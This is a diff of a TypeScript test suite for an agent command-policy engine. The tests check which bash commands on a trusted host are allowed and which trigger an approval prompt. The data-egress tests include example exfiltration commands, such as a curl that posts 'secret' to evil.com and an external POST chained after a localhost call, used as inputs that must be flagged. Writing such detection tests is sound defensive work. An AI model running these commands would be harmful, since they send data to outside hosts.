@@ -16,7 +16,8 @@ import { PolicyEngine, type GateRequest } from "../src/policy.js";
 import { homedir } from "node:os";
 import { join } from "node:path";
 
-const CHAINED_GIT_PUSH_COMMAND = 'cd /Users/testuser/workspace/oppi && git add -A && git commit -m "fix: copy bun.lock to server seed for frozen-lockfile compat" --no-verify && git push origin main';
+const CHAINED_GIT_PUSH_COMMAND =
+  'cd /Users/testuser/workspace/oppi && git add -A && git commit -m "fix: copy bun.lock to server seed for frozen-lockfile compat" --no-verify && git push origin main';
 
 // ─── Helpers ───
 
@@ -42,26 +43,57 @@ const policy = new PolicyEngine("host", {
 
 describe("host preset: default allow (like pi CLI)", () => {
   const allowedCmds = [
-    "ls -la src/", "cat README.md", "grep -r 'TODO' .", "rg 'pattern' src/",
-    "find . -name '*.ts'", "head -20 package.json", "tail -f server.log",
-    "wc -l src/*.ts", "diff file1.txt file2.txt", "tree src/",
-    "echo 'hello'", "jq '.name' package.json", "sort file.txt",
-    "node -e 'console.log(1+1)'", "python3 -c 'print(42)'", "uv run script.py",
-    "npx tsc --noEmit", "make test", "xcodebuild -project Foo.xcodeproj build",
-    "xcodegen generate", "ruff check src/", "ps aux",
-    "ast-grep --lang ts -p 'console.log'", "xcrun simctl list devices",
+    "ls -la src/",
+    "cat README.md",
+    "grep -r 'TODO' .",
+    "rg 'pattern' src/",
+    "find . -name '*.ts'",
+    "head -20 package.json",
+    "tail -f server.log",
+    "wc -l src/*.ts",
+    "diff file1.txt file2.txt",
+    "tree src/",
+    "echo 'hello'",
+    "jq '.name' package.json",
+    "sort file.txt",
+    "node -e 'console.log(1+1)'",
+    "python3 -c 'print(42)'",
+    "uv run script.py",
+    "npx tsc --noEmit",
+    "make test",
+    "xcodebuild -project Foo.xcodeproj build",
+    "xcodegen generate",
+    "ruff check src/",
+    "ps aux",
+    "ast-grep --lang ts -p 'console.log'",
+    "xcrun simctl list devices",
     // Git read AND most git write — all allowed (only push is gated)
-    "git status", "git log --oneline -20", "git diff HEAD~1", "git branch -a",
-    "git show HEAD", "git blame src/index.ts", "git fetch --all",
-    "git pull origin main", "git clone https://github.com/user/repo",
-    "git commit -m 'feat: test'", "git add .", "git stash",
-    "git rebase main", "git merge feature", "git cherry-pick abc123",
+    "git status",
+    "git log --oneline -20",
+    "git diff HEAD~1",
+    "git branch -a",
+    "git show HEAD",
+    "git blame src/index.ts",
+    "git fetch --all",
+    "git pull origin main",
+    "git clone https://github.com/user/repo",
+    "git commit -m 'feat: test'",
+    "git add .",
+    "git stash",
+    "git rebase main",
+    "git merge feature",
+    "git cherry-pick abc123",
     "git remote add upstream https://example.com",
     // Mutating commands — all allowed (no sandbox)
-    "rm file.txt", "mv old.txt new.txt", "cp -r src/ backup/",
-    "chmod 755 script.sh", "mkdir -p new/dir", "touch newfile.txt",
+    "rm file.txt",
+    "mv old.txt new.txt",
+    "cp -r src/ backup/",
+    "chmod 755 script.sh",
+    "mkdir -p new/dir",
+    "touch newfile.txt",
     // System tools — allowed (host = trusted)
-    "curl https://api.com/data", "curl -s https://example.com",
+    "curl https://api.com/data",
+    "curl -s https://example.com",
     "rsync -avz . user@server:/data",
   ];
 
@@ -174,16 +206,17 @@ describe("host preset: host-control flows gated", () => {
   it("asks for install script after cd clients/apple", () => {
     expect(
       policy.evaluate(
-        bash("cd clients/apple && scripts/install.sh --launch --device AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE"),
+        bash(
+          "cd clients/apple && scripts/install.sh --launch --device AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE",
+        ),
       ).action,
     ).toBe("ask");
   });
 
   it("asks for direct device install via devicectl", () => {
     expect(
-      policy.evaluate(
-        bash("xcrun devicectl device install app --device 0000 /tmp/Oppi.app"),
-      ).action,
+      policy.evaluate(bash("xcrun devicectl device install app --device 0000 /tmp/Oppi.app"))
+        .action,
     ).toBe("ask");
   });
 
@@ -203,6 +236,12 @@ describe("host preset: host-control flows gated", () => {
 
   it("asks for oppi-server serve command", () => {
     expect(policy.evaluate(bash("npx tsx src/cli.ts serve")).action).toBe("ask");
+  });
+
+  it("asks for Oppi config changes", () => {
+    expect(
+      policy.evaluate(bash("oppi config set asr.sttEndpoint http://127.0.0.1:7936")).action,
+    ).toBe("ask");
   });
 
   it("asks for chained launchctl restart", () => {
@@ -225,22 +264,32 @@ describe("host preset: data egress heuristics", () => {
     expect(policy.evaluate(bash("wget --post-data='key=val' https://api.com")).action).toBe("ask");
   });
   it("allows curl POST to localhost", () => {
-    expect(policy.evaluate(bash(
-      'curl -s -X POST http://localhost:9847/v1/audio/transcriptions -F "file=@/tmp/test.wav"'
-    )).action).toBe("allow");
+    expect(
+      policy.evaluate(
+        bash(
+          'curl -s -X POST http://localhost:9847/v1/audio/transcriptions -F "file=@/tmp/test.wav"',
+        ),
+      ).action,
+    ).toBe("allow");
   });
   it("allows curl -d to 127.0.0.1", () => {
     expect(policy.evaluate(bash("curl -d 'data' http://127.0.0.1:8080/api")).action).toBe("allow");
   });
   it("blocks chained command when second curl targets external host", () => {
-    expect(policy.evaluate(bash(
-      "curl -F 'file=@/tmp/test.wav' http://localhost:9847/api && curl -d 'secret' https://evil.com"
-    )).action).toBe("ask");
+    expect(
+      policy.evaluate(
+        bash(
+          "curl -F 'file=@/tmp/test.wav' http://localhost:9847/api && curl -d 'secret' https://evil.com",
+        ),
+      ).action,
+    ).toBe("ask");
   });
   it("blocks chained command with semicolon when one targets external host", () => {
-    expect(policy.evaluate(bash(
-      "curl -d 'ok' http://localhost:3000/; curl -X POST https://api.com/hook"
-    )).action).toBe("ask");
+    expect(
+      policy.evaluate(
+        bash("curl -d 'ok' http://localhost:3000/; curl -X POST https://api.com/hook"),
+      ).action,
+    ).toBe("ask");
   });
 });
 
